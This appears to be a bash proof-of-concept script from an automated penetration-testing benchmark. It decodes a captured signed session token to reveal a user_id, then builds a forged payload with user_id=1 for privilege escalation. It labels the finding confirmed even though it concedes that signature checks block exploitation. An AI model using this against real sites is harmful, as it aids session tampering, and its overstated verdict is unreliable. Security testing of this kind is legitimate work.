#!/bin/bash
# POC: Demonstrates weak session token encoding vulnerability by decoding base64 JWT payload without cryptographic keys
# Target: ./repo
# Created: 2025-11-07T18:53:22.577Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# Weak Session Token Encoding POC - Version 2
# This script demonstrates the vulnerability of using base64-encoded JSON tokens
# without proper cryptographic protection

echo "=== Weak Session Token Encoding Vulnerability POC ==="
echo ""

# Token captured from application
SESSION_TOKEN="eyJ1c2VyX2lkIjoxMDAzMn0.aQ4_6A.jnUcCihJjpnksG352yDLz5uP37s"
echo "[+] Captured Session Token: $SESSION_TOKEN"
echo ""

# Extract the payload part (first part before the first dot)
PAYLOAD_B64=$(echo "$SESSION_TOKEN" | cut -d'.' -f1)
echo "[+] Extracted Base64 Payload: $PAYLOAD_B64"
echo ""

# Decode the base64 payload using printf
echo "[+] Decoding Base64 payload..."

# Try different decoding methods
DECODED_PAYLOAD=$(printf '%s' "$PAYLOAD_B64" | base64 -d 2>/dev/null)

if [ -z "$DECODED_PAYLOAD" ]; then
    # Try with openssl if base64 fails
    DECODED_PAYLOAD=$(echo "$PAYLOAD_B64" | openssl base64 -d 2>/dev/null)
fi

if [ -n "$DECODED_PAYLOAD" ] && echo "$DECODED_PAYLOAD" | grep -q "user_id"; then
    echo "[✓] VULNERABILITY CONFIRMED - Token payload decoded successfully!"
    echo "[✓] Decoded Payload: $DECODED_PAYLOAD"
    echo ""
    
    # Extract the user_id
    USER_ID=$(echo "$DECODED_PAYLOAD" | grep -o '"user_id":[0-9]*' | cut -d':' -f2)
    echo "[✓] Extracted user_id from token: $USER_ID"
    echo ""
    
    echo "=== Vulnerability Analysis ==="
    echo "[!] Token structure is trivially decodable without any cryptographic keys"
    echo "[!] User identification information (user_id: $USER_ID) is visible in plaintext"
    echo "[!] Attacker can understand application's user identification mechanism"
    echo "[!] This enables privilege escalation attacks if signature validation is bypassed"
    echo ""
    
    # Demonstrate token modification capability
    echo "=== Demonstrating Token Modification Capability ==="
    echo "[+] Creating modified payload with user_id=1..."
    
    MODIFIED_PAYLOAD='{"user_id":1}'
    echo "[+] Modified payload: $MODIFIED_PAYLOAD"
    
    MODIFIED_B64=$(printf '%s' "$MODIFIED_PAYLOAD" | base64 -w0)
    echo "[+] Base64 encoded modified payload: $MODIFIED_B64"
    echo ""
    
    echo "[!] While signature validation prevents direct exploitation:"
    echo "[!] - The weak token design increases attack surface"
    echo "[!] - Token structure is completely transparent to attackers"
    echo "[!] - If signature validation is later removed/bypassed, full privilege escalation is possible"
    echo "[!] - Timing attacks or cryptographic weaknesses could compromise signature verification"
    echo ""
    
    echo "[✓] VULNERABILITY SUCCESSFULLY DEMONSTRATED"
    exit 0
else
    echo "[-] Failed to decode payload or payload doesn't contain expected format"
    echo "[-] Decoded output: $DECODED_PAYLOAD"
    exit 1
fi